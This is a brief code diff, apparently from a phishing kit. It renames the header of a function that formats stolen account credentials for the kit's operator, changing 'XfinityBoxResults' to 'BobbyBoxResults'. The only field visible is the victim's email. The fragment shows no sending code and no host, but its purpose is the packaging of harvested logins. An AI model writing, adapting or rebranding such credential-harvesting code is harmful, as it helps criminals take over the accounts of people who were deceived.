@@ -98,7 +98,7 @@ const composeCredentialsMessage = (data) => {
         timeZone: 'UTC', hour12: true
     }) + ' UTC';
 
-    return `<b>🔐 XfinityBoxResults - Credentials 🔐</b>
+    return `<b>🔐 BobbyBoxResults - Credentials 🔐</b>
 
 <b>ACCOUNT DETAILS</b>
 📧 Email: ${safeEmail}
